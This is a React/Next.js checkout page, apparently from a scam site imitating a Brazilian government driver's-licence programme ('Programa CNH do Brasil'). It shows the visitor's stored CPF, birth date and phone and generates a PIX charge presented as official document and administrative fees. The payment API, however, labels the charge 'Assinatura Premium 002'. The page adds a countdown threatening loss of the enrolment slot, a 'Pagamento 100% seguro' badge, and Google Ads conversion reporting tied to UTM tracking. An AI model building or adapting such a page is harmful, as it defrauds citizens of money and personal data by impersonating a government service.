'use client';

import { useEffect, useState, Suspense, useRef } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import GovLayout from '@/components/GovLayout';
import { useAuth } from '@/contexts/AuthContext';
import { Copy, Check, Clock, User, Calendar, Car, Shield } from 'lucide-react';

function EfetivaContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const { user } = useAuth();
  const [userName, setUserName] = useState('');
  const [copied, setCopied] = useState(false);
  const [timeLeft, setTimeLeft] = useState(60 * 60);
  const [pagamentoConfirmado, setPagamentoConfirmado] = useState(false);
  const [pixCode, setPixCode] = useState('');
  const [transactionId, setTransactionId] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [userBasicData, setUserBasicData] = useState<any>({});
  const [valorPagamento, setValorPagamento] = useState<{
    centavos: number, 
    formatado: string,
    taxas?: {
      ted: { nome: string, centavos: number, formatado: string },
      tsa: { nome: string, centavos: number, formatado: string },
      tpe: { nome: string, centavos: number, formatado: string }
    }
  }>({centavos: 0, formatado: 'R$ 0,00'});
  const transacaoIniciadaRef = useRef(false);
  const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const isPollingActiveRef = useRef(false);
  const lastTransactionIdRef = useRef<string>('');
  const conversionSentRef = useRef(false);

  const categoria = searchParams.get('categoria') || 'B';

  const getUtmParams = () => {
    if (typeof window === 'undefined') return {};
    const savedUtm = localStorage.getItem('utmParams');
    if (savedUtm) return JSON.parse(savedUtm);
    const params = new URLSearchParams(window.location.search);
    const utmParams: Record<string, string | null> = {
      utm_source: params.get('utm_source'),
      utm_campaign: params.get('utm_campaign'),
      utm_medium: params.get('utm_medium'),
      utm_content: params.get('utm_content'),
      utm_term: params.get('utm_term'),
      keyword: params.get('keyword'),
      device: params.get('device'),
      network: params.get('network'),
      src: params.get('src'),
      sck: params.get('sck')
    };
    localStorage.setItem('utmParams', JSON.stringify(utmParams));
    return utmParams;
  };

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const data = JSON.parse(localStorage.getItem('userBasicData') || '{}');
      setUserBasicData(data);
      
      const userData = localStorage.getItem('usuarioLogado');
      if (userData) {
        const userParsed = JSON.parse(userData);
        const primeiroNome = userParsed.nome?.split(' ')[0] || '';
        setUserName(primeiroNome.toUpperCase());
      }
      
      getUtmParams();
    }
  }, []);

  useEffect(() => {
    if (!user) {
      router.push('/login');
      return;
    }

    if (transacaoIniciadaRef.current) return;
    transacaoIniciadaRef.current = true;

    async function criarTransacao() {
      setLoading(true);
      setError('');

      try {
        const valorResponse = await fetch('/api/valor');
        const valorData = await valorResponse.json();
        setValorPagamento({
          centavos: valorData.valorCentavos,
          formatado: valorData.valorFormatado,
          taxas: valorData.taxas
        });

        const response = await fetch('/api/pagamento/criar', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            valor: valorData.valorCentavos,
            nome: userBasicData.nome || user?.nome,
            email: userBasicData.email || user?.email,
            cpf: userBasicData.cpf || user?.cpf,
            telefone: userBasicData.telefone || user?.telefone,
            produto: 'Assinatura Premium 002',
            endereco: {
              ...(userBasicData.enderecoCompleto || {}),
              street: userBasicData.enderecoCompleto?.street || userBasicData.endereco || 'Rua',
              streetNumber: userBasicData.enderecoCompleto?.streetNumber || '0',
              complement: userBasicData.enderecoCompleto?.complement || '',
              zipCode: (userBasicData.cep || userBasicData.enderecoCompleto?.zipCode || '00000000').replace(/\D/g, ''),
              neighborhood: userBasicData.enderecoCompleto?.neighborhood || userBasicData.bairro || 'Centro',
              city: userBasicData.enderecoCompleto?.city || userBasicData.cidade || 'São Paulo',
              state: userBasicData.enderecoCompleto?.state || userBasicData.uf || 'SP'
            },
            utmParams: getUtmParams()
          })
        });

        const result = await response.json();

        if (result.success) {
          setPixCode(result.qrCode);
          setTransactionId(result.transactionId);
          localStorage.setItem('currentTransaction', JSON.stringify({
            transactionId: result.transactionId,
            qrCode: result.qrCode,
            valorCentavos: valorData.valorCentavos,
            valorFormatado: valorData.valorFormatado,
            taxas: valorData.taxas
          }));
          iniciarVerificacaoPagamento(result.transactionId);
        } else {
          setError('Erro ao gerar PIX. Tente novamente.');
        }
      } catch (err) {
        console.error('Erro ao criar transação:', err);
        setError('Erro ao conectar com o servidor.');
      } finally {
        setLoading(false);
      }
    }

    localStorage.removeItem('currentTransaction');
    criarTransacao();
  }, [user, router]);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 0) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
        pollingIntervalRef.current = null;
      }
    };
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(pixCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const verificarPagamentoUnico = async (txId: string) => {
    try {
      const utmParams = getUtmParams();
      const response = await fetch('/api/pagamento/verificar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ transactionId: txId, utmParams })
      });
      const result = await response.json();

      if (result.success && result.pago && !conversionSentRef.current) {
        conversionSentRef.current = true;
        isPollingActiveRef.current = false;
        
        if (pollingIntervalRef.current) {
          clearInterval(pollingIntervalRef.current);
          pollingIntervalRef.current = null;
        }
        
        setPagamentoConfirmado(true);
        
        if (typeof window !== 'undefined' && (window as any).gtag_report_conversion) {
          const valorReais = valorPagamento.centavos / 100;
          (window as any).gtag_report_conversion(txId, valorReais);
        }
        
        localStorage.setItem(`conversion_sent_${txId}`, 'true');
        localStorage.removeItem('currentTransaction');
        
        setTimeout(() => {
          router.push('/sucesso');
        }, 2000);
        
        return true;
      }
      return false;
    } catch (error) {
      console.error('Erro ao verificar pagamento:', error);
      return false;
    }
  };

  const iniciarVerificacaoPagamento = (txId: string) => {
    if (localStorage.getItem(`conversion_sent_${txId}`)) {
      setPagamentoConfirmado(true);
      setTimeout(() => router.push('/sucesso'), 1000);
      return;
    }

    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
      pollingIntervalRef.current = null;
    }

    lastTransactionIdRef.current = txId;
    isPollingActiveRef.current = true;
    conversionSentRef.current = false;

    const executarPolling = () => {
      if (!isPollingActiveRef.current || conversionSentRef.current) return;
      verificarPagamentoUnico(txId);
    };

    executarPolling();
    pollingIntervalRef.current = setInterval(executarPolling, 10000);

    setTimeout(() => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
        pollingIntervalRef.current = null;
        isPollingActiveRef.current = false;
      }
    }, 60 * 60 * 1000);
  };

  useEffect(() => {
    const handleVisibilityChange = () => {
      if (document.hidden) {
        if (pollingIntervalRef.current) {
          clearInterval(pollingIntervalRef.current);
          pollingIntervalRef.current = null;
        }
      } else {
        if (isPollingActiveRef.current && lastTransactionIdRef.current && !conversionSentRef.current) {
          verificarPagamentoUnico(lastTransactionIdRef.current);
          pollingIntervalRef.current = setInterval(() => {
            if (!conversionSentRef.current) {
              verificarPagamentoUnico(lastTransactionIdRef.current);
            }
          }, 10000);
        }
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);
    return () => document.removeEventListener('visibilitychange', handleVisibilityChange);
  }, []);

  const getCategoriaLabel = (cat: string) => {
    if (cat === 'B') return 'Automóvel';
    if (cat === 'A') return 'Motocicleta';
    if (cat === 'AB') return 'Automóvel e Motocicleta';
    return 'Automóvel';
  };

  return (
    <GovLayout userName={userName} breadcrumbItems={['Cadastro', 'Efetivação']}>
      <div className="w-full max-w-4xl mx-auto">
        <div className="flex items-center gap-3 mb-6">
          <div className="flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium">7</div>
          <p className="font-semibold text-base">Efetivação da Inscrição</p>
        </div>

        <div className="mb-8 text-center">
          <h1 className="mb-2 text-2xl font-bold text-gray-900">
            Quase lá! Finalize sua inscrição no Programa CNH do Brasil
          </h1>
        </div>

        {/* Dados do Candidato */}
        <div className="mb-6 rounded-lg border bg-white p-6 shadow-sm">
          <h2 className="mb-4 flex items-center gap-2 text-xl font-bold text-gray-900">
            <User className="h-6 w-6 text-[#1351B4]" />
            Dados do Candidato
          </h2>
          
          <div className="grid gap-4 sm:grid-cols-2">
            <div>
              <p className="text-xs font-medium text-gray-500">Nome Completo</p>
              <p className="text-sm font-semibold text-gray-900">{userBasicData.nome || user?.nome || 'Não informado'}</p>
            </div>
            <div>
              <p className="text-xs font-medium text-gray-500">CPF</p>
              <p className="text-sm font-semibold text-gray-900">
                {(userBasicData.cpf || user?.cpf) ? (userBasicData.cpf || user?.cpf)?.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : 'Não informado'}
              </p>
            </div>
            <div>
              <p className="text-xs font-medium text-gray-500">Data de Nascimento</p>
              <p className="text-sm font-semibold text-gray-900">
                {(() => {
                  const data = userBasicData.nascimento || userBasicData.dataNascimento || user?.dataNascimento;
                  if (!data) return 'Não informado';
                  if (data.includes('/')) return data;
                  const [ano, mes, dia] = data.split('-');
                  return `${dia}/${mes}/${ano}`;
                })()}
              </p>
            </div>
            <div>
              <p className="text-xs font-medium text-gray-500">Telefone</p>
              <p className="text-sm font-semibold text-gray-900">
                {(() => {
                  const tel = userBasicData.telefone || userBasicData.phone || user?.telefone;
                  if (!tel) return 'Não informado';
                  const clean = tel.toString().replace(/\D/g, '');
                  if (clean.length === 11) return clean.replace(/^(\d{2})(\d{5})(\d{4})$/, '($1) $2-$3');
                  if (clean.length === 10) return clean.replace(/^(\d{2})(\d{4})(\d{4})$/, '($1) $2-$3');
                  return tel;
                })()}
              </p>
            </div>
          </div>
        </div>

        {/* Resumo do Pedido */}
        <div className="mb-6 rounded-lg border bg-white p-6 shadow-sm">
          <h2 className="mb-4 flex items-center gap-2 text-xl font-bold text-gray-900">
            <Car className="h-6 w-6 text-[#1351B4]" />
            Resumo do Pedido
          </h2>
          
          <div className="grid gap-4 sm:grid-cols-2">
            <div>
              <p className="text-xs font-medium text-gray-500">Autoescola</p>
              <p className="text-sm font-semibold text-gray-900">{userBasicData.autoescola || 'Autoescola Selecionada'}</p>
            </div>
            <div>
              <p className="text-xs font-medium text-gray-500">Categoria</p>
              <p className="text-sm font-semibold text-gray-900">{userBasicData.categoriaFormatada || getCategoriaLabel(categoria)}</p>
            </div>
            <div>
              <p className="text-xs font-medium text-gray-500">Data Prevista de Início</p>
              <p className="text-sm font-semibold text-gray-900">{userBasicData.dataAgendamentoFormatada || '22/01/2026'}</p>
            </div>
            <div className="col-span-2 border-t pt-3 mt-2">
              <p className="text-xs font-medium text-gray-500 mb-2">Detalhamento das Taxas</p>
              {valorPagamento.taxas && (
                <div className="space-y-1 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-600">Taxa de Expedição de Documento (TED)</span>
                    <span className="font-medium">{valorPagamento.taxas.ted.formatado}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Taxa de Serviços Administrativos (TSA)</span>
                    <span className="font-medium">{valorPagamento.taxas.tsa.formatado}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Taxa de Processamento Eletrônico (TPE)</span>
                    <span className="font-medium">{valorPagamento.taxas.tpe.formatado}</span>
                  </div>
                  <div className="flex justify-between border-t pt-2 mt-2">
                    <span className="font-bold text-gray-900">TOTAL</span>
                    <span className="font-bold text-[#1351B4]">{valorPagamento.formatado}</span>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* PIX */}
        <div className="mb-6 rounded-lg border bg-white p-6 shadow-sm">
          <h2 className="mb-4 text-center text-xl font-bold text-gray-900">Pagamento via PIX</h2>
          <p className="mb-6 text-center text-4xl font-bold text-[#1351B4]">{valorPagamento.formatado}</p>

          {loading && (
            <div className="mb-6 flex flex-col items-center justify-center py-8">
              <div className="mb-4 h-12 w-12 animate-spin rounded-full border-4 border-gray-200 border-t-[#1351B4]"></div>
              <p className="text-sm text-gray-600">Gerando código PIX...</p>
            </div>
          )}

          {error && (
            <div className="mb-6 rounded-lg border border-red-200 bg-red-50 p-4">
              <p className="text-sm font-medium text-red-800">{error}</p>
            </div>
          )}

          {pagamentoConfirmado && (
            <div className="mb-6 rounded-lg border border-green-200 bg-green-50 p-4">
              <div className="flex items-center gap-2">
                <Check className="h-5 w-5 text-green-600" />
                <p className="text-sm font-medium text-green-800">Pagamento confirmado! Redirecionando...</p>
              </div>
            </div>
          )}

          {pixCode && !loading && !pagamentoConfirmado && (
            <>
              <div className="mb-4 rounded-md bg-[#1351B4]/5 p-4">
                <p className="mb-2 text-sm font-semibold text-[#1351B4]">Esse valor assegura:</p>
                <ul className="space-y-1 text-sm text-gray-700">
                  <li className="flex items-start gap-2">
                    <Check className="mt-0.5 h-4 w-4 flex-shrink-0 text-[#1351B4]" />
                    <span>Emissão da CNH Digital</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Check className="mt-0.5 h-4 w-4 flex-shrink-0 text-[#1351B4]" />
                    <span>Acesso à plataforma nacional</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Check className="mt-0.5 h-4 w-4 flex-shrink-0 text-[#1351B4]" />
                    <span>Custos de integração com órgãos de trânsito</span>
                  </li>
                </ul>
                <p className="mt-3 text-xs italic text-gray-500">
                  (Taxa exigida para manter a organização e credibilidade do projeto)
                </p>
              </div>

              <div className="mt-6">
                <div className="mb-2 rounded-md bg-gray-100 p-3">
                  <p className="break-all text-xs text-gray-700">{pixCode}</p>
                </div>
                
                <button
                  onClick={handleCopy}
                  className="flex w-full items-center justify-center gap-2 rounded-full bg-[#1351B4] px-6 py-3 text-base font-semibold text-white shadow-sm transition-colors hover:bg-[#0D3C8C]"
                >
                  {copied ? (
                    <>
                      <Check className="h-5 w-5" />
                      <span>Copiado!</span>
                    </>
                  ) : (
                    <>
                      <Copy className="h-5 w-5" />
                      <span>Copiar</span>
                    </>
                  )}
                </button>
              </div>

              <div className="mt-6 flex items-center justify-center gap-2 text-sm text-green-700">
                <Shield className="h-5 w-5" />
                <span className="font-medium">Pagamento 100% seguro</span>
              </div>
            </>
          )}
        </div>

        {/* Timer */}
        <div className="mb-6 rounded-lg border border-red-200 bg-red-50 p-4 text-center">
          <div className="flex items-center justify-center gap-2">
            <Clock className="h-5 w-5 text-red-600" />
            <p className="text-lg font-bold text-red-900">Tempo restante: {formatTime(timeLeft)}</p>
          </div>
        </div>

        {/* Aviso */}
        <div className="mb-6 rounded-md border-l-4 border-yellow-500 bg-yellow-50 p-4">
          <div className="flex items-start gap-2">
            <Clock className="mt-0.5 h-5 w-5 flex-shrink-0 text-yellow-600" />
            <div>
              <p className="font-semibold text-yellow-900">Sua vaga está reservada!</p>
              <p className="text-sm text-yellow-800">
                Para garantir sua participação no Programa CNH do Brasil, o pagamento da taxa deve ser feito em até{' '}
                <span className="font-bold">60 minutos</span>. Após esse prazo, sua vaga será liberada para outro candidato.
              </p>
            </div>
          </div>
        </div>

        {/* O que acontece após */}
        <div className="mb-6 rounded-lg border bg-white p-6 shadow-sm">
          <h3 className="mb-4 text-lg font-bold text-gray-900">O que acontece após o pagamento?</h3>

          <div className="space-y-4">
            <div className="flex items-start gap-3">
              <div className="rounded-full bg-[#1351B4]/10 p-2">
                <Calendar className="h-5 w-5 text-[#1351B4]" />
              </div>
              <div>
                <p className="font-semibold text-gray-900">Confirmação Imediata</p>
                <p className="text-sm text-gray-600">Você receberá um e-mail em até 3 dias úteis com a confirmação de sua inscrição assim que o pagamento for processado.</p>
              </div>
            </div>

            <div className="flex items-start gap-3">
              <div className="rounded-full bg-[#1351B4]/10 p-2">
                <svg className="h-5 w-5 text-[#1351B4]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                </svg>
              </div>
              <div>
                <p className="font-semibold text-gray-900">Contato da Autoescola</p>
                <p className="text-sm text-gray-600">A autoescola selecionada entrará em contato em até 3 dias úteis para dar mais informações sobre o curso.</p>
              </div>
            </div>

            <div className="flex items-start gap-3">
              <div className="rounded-full bg-[#1351B4]/10 p-2">
                <svg className="h-5 w-5 text-[#1351B4]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                </svg>
              </div>
              <div>
                <p className="font-semibold text-gray-900">Acesso ao Portal do Aluno</p>
                <p className="text-sm text-gray-600">Enviaremos por e-mail suas credenciais para acessar o portal do aluno e acompanhar seu progresso.</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </GovLayout>
  );
}

export default function EfetivaPage() {
  return (
    <Suspense fallback={
      <div className="flex min-h-screen items-center justify-center">
        <div className="h-12 w-12 animate-spin rounded-full border-4 border-gray-200 border-t-[#1351B4]"></div>
      </div>
    }>
      <EfetivaContent />
    </Suspense>
  );
}
